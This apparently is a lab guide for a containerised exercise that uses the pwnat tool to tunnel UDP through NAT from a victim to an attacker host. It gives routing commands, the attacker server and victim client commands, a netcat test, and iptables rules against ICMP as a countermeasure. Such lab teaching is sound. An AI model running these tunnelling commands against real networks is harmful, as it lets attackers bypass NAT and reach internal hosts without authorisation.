The IP addresses for these containers are:
Attacker: 172.16.100.200
Router: WAN IP 172.16.100.10, LAN IP 192.168.1.10
Victim: 192.168.1.50
Configuring the Router:

Set the default route for attacker by using the following command 
```
ip route del default
ip route add default via 172.16.100.10 dev eth0
```

Set the default route for victim by using the following command 
```
ip route del default
ip route add default via 192.168.1.10 dev eth0
```
Access the router container using 
``docker exec -it router /bin/bash``
Run ``bash vyos_routes.sh`` to load routes and iptables rules.
Starting the Attacker Server:

Access the attacker container using ``docker exec -it attacker /bin/bash``.
Start the server with ``pwnat -s``.
Configuring the Victim:

Access the victim container using ``docker exec -it victim /bin/bash``.
Run ``./code/pwnat -c 8000 172.16.100.200 purdue.edu 80`` to configure the client for the NAT exploit.

Testing the Exploit:
On the Docker host, run ``nc 192.168.1.50 8000`` to test the UDP tunnel.

Understanding the Exploit:
The exploit uses ICMP type 8 (echo request) and type 11 (time-to-live exceeded) to create a transparent UDP tunnel in NAT.

Implementing Countermeasures:
On the VyOS router container, run the following commands to block malicious ICMP packets:
``iptables -A INPUT -p icmp --icmp-type 11 -j DROP``
``iptables -A OUTPUT -p icmp --icmp-type 11 -j DROP``
Understanding Limitations:

The exploit's effectiveness is limited in Docker container networking due to direct routes from each Docker container network to the raw Network Interface Card (NIC).
Key Points:

UDP can be spoofed to allow tunneling of TCP protocols.
ICMP is vulnerable to attacks like redirects and TTL malforming.
NAT can be manipulated to allow malicious traffic into an internal network.
